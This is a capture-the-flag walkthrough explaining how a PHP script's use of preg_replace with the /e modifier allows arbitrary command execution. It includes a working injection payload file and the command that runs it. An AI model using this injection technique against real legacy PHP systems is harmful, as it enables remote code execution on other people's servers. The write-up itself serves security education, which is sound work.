
# Level06 Walkthrough

## Description
This level contains a PHP script (`level06.php`) that has a critical vulnerability in the use of the `/e` modifier in the `preg_replace` function. This modifier allows PHP code execution, which we can exploit to execute arbitrary commands.

## Vulnerable Code
The script performs the following:
1. The `y()` function replaces `.` with ` x ` and `@` with ` y`.
2. The `x()` function:
   - Reads the file content specified in the first argument.
   - Applies `preg_replace` with the `/e` modifier to evaluate and execute code dynamically.
   - Converts `[` and `]` to `(` and `)`.
3. The script processes the file provided as an argument, replacing patterns and executing PHP code dynamically.

## Exploitation Steps
1. **Craft the Payload File**
   - Create a malicious file that triggers the vulnerable `preg_replace` function to execute the `getflag` command:
     ```bash
     echo '[x ${`getflag`}]' > /tmp/exploit.txt
     ```

2. **Execute the Exploit**
   - Run the `level06` binary with the crafted payload file as an argument:
     ```bash
     ./level06 /tmp/exploit.txt
     ```

## Explanation of Exploit
- The `[x ${\`getflag\`}]` pattern is processed by the vulnerable `preg_replace` function.
- The `/e` modifier in `preg_replace` evaluates `${\`getflag\`}` as a shell command, resulting in the execution of `getflag`.
- The output of the `getflag` command reveals the flag.

**Important Note:** The `/e` modifier in `preg_replace` is deprecated and removed in modern PHP versions due to its security risks.
